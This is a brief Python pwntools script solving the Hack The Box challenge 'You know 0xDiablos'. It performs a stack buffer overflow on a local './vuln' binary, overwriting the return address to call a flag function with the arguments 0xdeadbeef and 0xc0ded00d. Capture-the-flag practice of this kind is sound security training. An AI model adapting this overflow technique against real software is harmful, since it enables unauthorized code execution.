# HTB - You know 0xDiablos 

from pwn import *

p = process('./vuln')
p.recvuntil('You know who are 0xDiablos:')

offset = '0'*188
flag_address = p32(0x080491e2)

arg_padding = '0'*4
arg1 = p32(0xdeadbeef)
arg2 = p32(0xc0ded00d)

payload = offset+flag_address+arg_padding+arg1+arg2

p.sendline(payload)
p.interactive()